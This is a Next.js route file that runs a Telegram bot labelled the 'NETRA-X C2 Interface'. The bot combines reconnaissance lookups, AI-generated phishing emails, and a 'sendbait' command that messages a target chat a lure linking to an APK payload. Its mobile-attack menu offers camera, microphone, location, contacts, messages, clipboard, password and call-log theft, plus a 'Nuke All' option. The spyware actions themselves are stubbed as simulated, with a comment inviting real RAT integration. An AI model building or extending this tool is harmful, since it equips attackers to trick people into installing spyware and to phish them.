
'use server';

import { NextRequest, NextResponse } from 'next/server';
import { scanSubdomains } from '@/actions/osint-actions';
import { dnsLookup } from '@/actions/osint-actions';
import { generatePhishingEmail } from '@/ai/flows/phishing-flow';
import { whoisLookup } from '@/actions/osint-actions';

// Environment variables
const PAYLOAD_LINK = process.env.PAYLOAD_LINK || "YOUR_APK_LINK";
const SERVER_ENDPOINT = process.env.SERVER_ENDPOINT || "YOUR_SERVER_ENDPOINT";

type CommandResponse = {
    text: string;
    parse_mode?: 'Markdown' | 'HTML';
    reply_markup?: any;
    additionalActions?: Array<{ 
        type: 'send_bait' | 'trigger_attack', 
        targetId?: string, 
        attackType?: string 
    }>;
};

// --- Main Menu ---
const showMainMenu = async (chatId: string): Promise<CommandResponse> => {
    const text = `*Welcome to the NETRA-X C2 Interface*

Please select a command category from the menu below:`;

    const reply_markup = {
        inline_keyboard: [
            [{ text: "Reconnaissance", callback_data: "menu_recon" }],
            [{ text: "Phishing", callback_data: "menu_phishing" }],
            [{ text: "Mobile Attacks", callback_data: "menu_mobile" }],
            [{ text: "Health Check", callback_data: "cmd_ping" }],
        ],
    };
    return { text, parse_mode: 'Markdown', reply_markup };
};

// --- Recon Menu ---
const showReconMenu = async (): Promise<CommandResponse> => {
    const text = `*Reconnaissance Menu*

Select a tool to use:`;
    const reply_markup = {
        inline_keyboard: [
            [{ text: "Subdomain Scan", callback_data: "recon_subdomain" }],
            [{ text: "DNS Lookup", callback_data: "recon_dns" }],
            [{ text: "WHOIS Lookup", callback_data: "recon_whois" }],
            [{ text: "« Back to Main Menu", callback_data: "menu_main" }],
        ],
    };
    return { text, parse_mode: 'Markdown', reply_markup };
};

// --- Phishing Menu ---
const showPhishingMenu = async (): Promise<CommandResponse> => {
    const text = `*Phishing Menu*

Select a tool to use:`;
    const reply_markup = {
        inline_keyboard: [
            [{ text: "Generate AI Email", callback_data: "phishing_ai" }],
            [{ text: "« Back to Main Menu", callback_data: "menu_main" }],
        ],
    };
     return { text, parse_mode: 'Markdown', reply_markup };
};

// --- Mobile Attacks Menu ---
const showMobileMenu = async (): Promise<CommandResponse> => {
    const text = `*Mobile Attacks Menu*

Select an attack type:`;
    const reply_markup = {
        inline_keyboard: [
            [{ text: "Camera", callback_data: "attack_cam" }],
            [{ text: "Microphone", callback_data: "attack_mic" }],
            [{ text: "Location", callback_data: "attack_loc" }],
            [{ text: "Contacts", callback_data: "attack_contacts" }],
            [{ text: "Messages", callback_data: "attack_msgs" }],
            [{ text: "Clipboard", callback_data: "attack_clip" }],
            [{ text: "Passwords", callback_data: "attack_pass" }],
            [{ text: "Call Logs", callback_data: "attack_calls" }],
            [{ text: "Nuke All", callback_data: "attack_nuke" }],
            [{ text: "« Back to Main Menu", callback_data: "menu_main" }],
        ],
    };
    return { text, parse_mode: 'Markdown', reply_markup };
};

// Track infected targets
const infectedTargets: Record<string, string> = {};
const conversationState: Record<string, { command: string, step: number, data: any }> = {};

// Command handler
async function handleCommand(command: string, args: string[], chatId: string): Promise<CommandResponse> {
    const normalizedCommand = command.substring(1).toLowerCase();

    switch (normalizedCommand) {
        case 'ping':
            return { text: 'Pong! The NETRA-X C2 server is active and responsive.' };
        
        case 'start':
        case 'help':
        case 'menu':
            return showMainMenu(chatId);
        
        case 'sendbait':
            if (args.length < 1) {
                return { text: 'Usage: /sendbait <target_chat_id>' };
            }
            const targetId = args[0];
            infectedTargets[chatId] = targetId;
            return {
                text: `Bait sent to ${targetId}. Waiting for bite.`,
                additionalActions: [{ type: 'send_bait', targetId }]
            };

        default:
            return { text: `Unknown command: ${command}. Type /start for the main menu.` };
    }
}

// Message handler
async function handleMessage(message: any): Promise<CommandResponse> {
    const chatId = message.chat.id.toString();
    const text = message.text || '';
    
    if (conversationState[chatId]) {
        const state = conversationState[chatId];
        const args = text.trim().split(/\s+/);
        return await processConversation(state, args, chatId);
    }
    
    if (text.startsWith('/')) {
        const parts = text.trim().split(/\s+/);
        const command = parts[0];
        const args = parts.slice(1);
        return await handleCommand(command, args, chatId);
    }

    return { text: "I'm not sure how to respond to that. Please use a command starting with /" };
}

// Callback handler
async function handleCallbackQuery(callbackQuery: any): Promise<CommandResponse> {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id.toString();
    const [command, ...args] = data.split('_');

    switch (command) {
        case 'menu':
            if (args[0] === 'recon') return showReconMenu();
            if (args[0] === 'phishing') return showPhishingMenu();
            if (args[0] === 'mobile') return showMobileMenu();
            return showMainMenu(chatId);
        
        case 'cmd':
            return handleCommand(`/${args[0]}`, [], chatId);
        
        case 'recon':
            conversationState[chatId] = { command: args[0], step: 1, data: {} };
            return processConversation(conversationState[chatId], [], chatId);
            
        case 'phishing':
            conversationState[chatId] = { command: args[0], step: 1, data: {} };
            return processConversation(conversationState[chatId], [], chatId);
            
        case 'attack':
            const targetId = infectedTargets[chatId];
            if (!targetId) {
                return { text: "No target infected yet. Use /sendbait first." };
            }
            
            if (args[0] === 'nuke') {
                return {
                    text: "Nuking all data...",
                    additionalActions: [
                        { type: 'trigger_attack', targetId, attackType: 'cam' },
                        { type: 'trigger_attack', targetId, attackType: 'mic' },
                        { type: 'trigger_attack', targetId, attackType: 'loc' },
                        { type: 'trigger_attack', targetId, attackType: 'contacts' },
                        { type: 'trigger_attack', targetId, attackType: 'msgs' },
                        { type: 'trigger_attack', targetId, attackType: 'clip' },
                        { type: 'trigger_attack', targetId, attackType: 'pass' },
                        { type: 'trigger_attack', targetId, attackType: 'calls' },
                    ]
                };
            }
            
            return {
                text: `Running ${args[0]} attack...`,
                additionalActions: [{ type: 'trigger_attack', targetId, attackType: args[0] }]
            };

        default:
            return { text: 'Unknown selection.' };
    }
}

// Process multi-step commands
async function processConversation(state: { command: string, step: number, data: any }, args: string[], chatId: string): Promise<CommandResponse> {
    switch (state.command) {
        case 'subdomain':
            if (state.step === 1) {
                state.step = 2;
                return { text: 'Please enter the domain to scan for subdomains:' };
            }
            if (state.step === 2) {
                delete conversationState[chatId];
                const domain = args[0];
                if (!domain) return { text: 'Invalid domain. Please start over.' };
                try {
                    const subdomains = await scanSubdomains(domain);
                    const message = subdomains.length > 0 
                        ? `Found ${subdomains.length} subdomains for ${domain}:\n${subdomains.join('\n')}` 
                        : `No subdomains found for ${domain}.`;
                    return { text: message };
                } catch (e: any) {
                    return { text: `Error: ${e.message}` };
                }
            }
            break;
            
        case 'dns':
            if (state.step === 1) {
                state.step = 2;
                return { text: 'Please enter domain and record type (e.g., `google.com MX`):' };
            }
            if (state.step === 2) {
                delete conversationState[chatId];
                if (args.length < 2) return { text: 'Invalid input. Please provide domain and record type.' };
                try {
                    const records = await dnsLookup(args[0], args[1].toUpperCase());
                    const message = records.length > 0 
                        ? `DNS Records for ${args[0]} [${args[1].toUpperCase()}]:\n${records.map(r => r.value).join('\n')}` 
                        : 'No records found.';
                    return { text: message };
                } catch(e: any) {
                     return { text: `Error: ${e.message}` };
                }
            }
            break;
        
        case 'whois':
            if (state.step === 1) {
                state.step = 2;
                return { text: 'Please enter the domain for WHOIS lookup:' };
            }
             if (state.step === 2) {
                delete conversationState[chatId];
                if (!args[0]) return { text: 'Invalid domain. Please start over.'};
                try {
                    const result = await whoisLookup(args[0]);
                    return { text: `WHOIS Record for ${args[0]}:\n\n${result}` };
                } catch(e: any) {
                    return { text: `Error: ${e.message}` };
                }
            }
            break;
            
        case 'ai': // Phishing AI
            if (state.step === 1) {
                state.step = 2;
                return { text: 'Describe the phishing scenario (e.g., "Urgent invoice for accountant at Google"):' };
            }
            if (state.step === 2) {
                delete conversationState[chatId];
                const scenario = args.join(' ');
                if (!scenario) return { text: 'Invalid scenario. Please start over.' };
                try {
                    const result = await generatePhishingEmail({ company: 'Target', role: 'Employee', scenario });
                    return { 
                        text: `*Subject:* ${result.subject}\n\n*Body:*\n${result.body.replace(/<[^>]+>/g, '')}`,
                        parse_mode: 'Markdown'
                    };
                } catch(e: any) {
                    return { text: `Error: ${e.message}` };
                }
            }
            break;
    }
    delete conversationState[chatId];
    return { text: 'Something went wrong. Please start over with /start.' };
}

// Send Telegram message helper
async function sendTelegramMessage(
    token: string,
    method: 'sendMessage' | 'editMessageText',
    payload: any
) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        
        if (!response.ok) {
            console.error('Telegram API error:', await response.text());
        }
    } catch (error) {
        console.error('Failed to send Telegram message:', error);
    }
}

// API Route Handler
export async function POST(req: NextRequest, { params }: { params: { token: string }}) {
    const token = params.token;
    
    if (!token) {
        return NextResponse.json({ error: 'Webhook misconfigured.' }, { status: 401 });
    }

    try {
        const body = await req.json();
        let responsePayload: CommandResponse;
        let isCallback = false;
        let chatId: string | undefined;
        let messageId: number | undefined;

        if (body.callback_query) {
            isCallback = true;
            responsePayload = await handleCallbackQuery(body.callback_query);
            chatId = body.callback_query.message?.chat?.id?.toString();
            messageId = body.callback_query.message?.message_id;
            
            // Answer callback query to remove loading state
            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery?callback_query_id=${body.callback_query.id}`);
        } else if (body.message) {
            responsePayload = await handleMessage(body.message);
            chatId = body.message.chat?.id?.toString();
        } else {
            return NextResponse.json({ status: 'ok', message: 'Update type not handled.' });
        }
        
        if (!chatId) {
            return NextResponse.json({ status: 'ok', message: 'Could not determine chat ID.' });
        }

        // Prepare main response payload
        const mainPayload: any = {
            chat_id: chatId,
            text: responsePayload.text,
            ...(responsePayload.parse_mode && { parse_mode: responsePayload.parse_mode }),
            ...(responsePayload.reply_markup && { reply_markup: responsePayload.reply_markup })
        };

        // Determine if we should edit the existing message or send a new one.
        const method = isCallback ? 'editMessageText' : 'sendMessage';

        // Add message_id for callback edits
        if (isCallback && messageId) {
            mainPayload.message_id = messageId;
        }

        // Send main response
        await sendTelegramMessage(
            token,
            method,
            mainPayload
        );

        // Handle additional actions (like sending bait to a different chat)
        if (responsePayload.additionalActions) {
            for (const action of responsePayload.additionalActions) {
                if (action.type === 'send_bait' && action.targetId) {
                    await sendTelegramMessage(
                        token,
                        'sendMessage',
                        {
                            chat_id: action.targetId,
                            text: `Check out this cool app! ${PAYLOAD_LINK}`
                        }
                    );
                }
                else if (action.type === 'trigger_attack' && action.targetId && action.attackType) {
                    // Simulate attack - replace with actual RAT integration
                    const result = `Simulated ${action.attackType} data from ${action.targetId}`;
                    
                    await sendTelegramMessage(
                        token,
                        'sendMessage',
                        {
                            chat_id: chatId,
                            text: `${action.attackType.toUpperCase()} Attack Result:\n${result}`
                        }
                    );
                }
            }
        }

        return NextResponse.json({ status: 'ok' });

    } catch (error) {
        console.error('Error in Telegram webhook:', error);
        return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
    }
}
